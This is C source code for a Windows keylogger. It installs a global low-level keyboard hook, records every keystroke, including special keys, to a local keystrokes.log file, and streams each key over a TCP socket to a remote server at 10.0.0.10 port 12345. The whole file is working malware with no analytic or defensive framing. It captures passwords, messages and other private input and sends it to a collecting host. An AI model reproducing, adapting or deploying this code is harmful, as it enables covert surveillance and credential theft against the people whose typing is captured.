#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

// Function declarations
void logKey(const char* key);
void initSocket();
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void startWindowsKeylogger();

// Declare socket variables
static int sockfd = -1; // Socket file descriptor
struct sockaddr_in server_addr;

// Function to initialize the socket and connect to the server
void initSocket() {
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("WSAStartup failed");
        exit(EXIT_FAILURE);
    }

    // Create a socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Define the server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(12345); // Use the same port as your Python server
    inet_pton(AF_INET, "10.0.0.10", &server_addr.sin_addr); // Replace with your server IP

    // Connect to the server
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection to server failed");
        exit(EXIT_FAILURE);
    }
}

// Windows-specific keylogger function
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            DWORD vkCode = pKeyBoard->vkCode; // Virtual key code
            char key[16];  // Buffer to store the key as a string

            // Get the keyboard state
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);

            // Translate the virtual key code to ASCII using ToAscii
            WORD asciiCode;
            int result = ToAscii(vkCode, pKeyBoard->scanCode, keyboardState, &asciiCode, 0);

            if (result == 1) { // If ToAscii successfully translated a character
                sprintf_s(key, sizeof(key), "%c", asciiCode);
            }
            else {
                // Handle special keys
                switch (vkCode) {
                case VK_RETURN:
                    strcpy_s(key, sizeof(key), "[ENTER]");
                    break;
                case VK_BACK:
                    strcpy_s(key, sizeof(key), "[BACKSPACE]");
                    break;
                case VK_SPACE:
                    strcpy_s(key, sizeof(key), "[SPACE]");
                    break;
                case VK_TAB:
                    strcpy_s(key, sizeof(key), "[TAB]");
                    break;
                case VK_ESCAPE:
                    strcpy_s(key, sizeof(key), "[ESC]");
                    break;
                default:
                    sprintf_s(key, sizeof(key), "[%d]", vkCode); // Log other keys as their virtual key code
                }
            }

            logKey(key);  // Log the key or send it to the server
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void startWindowsKeylogger() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

// Function to log key events
void logKey(const char* key) {
    // Ensure the socket is initialized
    if (sockfd == -1) {
        initSocket(); // Initialize and connect the socket
    }

    // Log to a file
    FILE* file = fopen("keystrokes.log", "a");
    if (file == NULL) {
        perror("Could not open log file");
        return;
    }
    fprintf(file, "%s", key); // Write the key to the log file
    fclose(file);

    // Send the keystroke to the server
    send(sockfd, key, strlen(key), 0); // Send the key to the server
}

int main() {
    // Start platform-specific keylogger
    startWindowsKeylogger();
    return 0;
}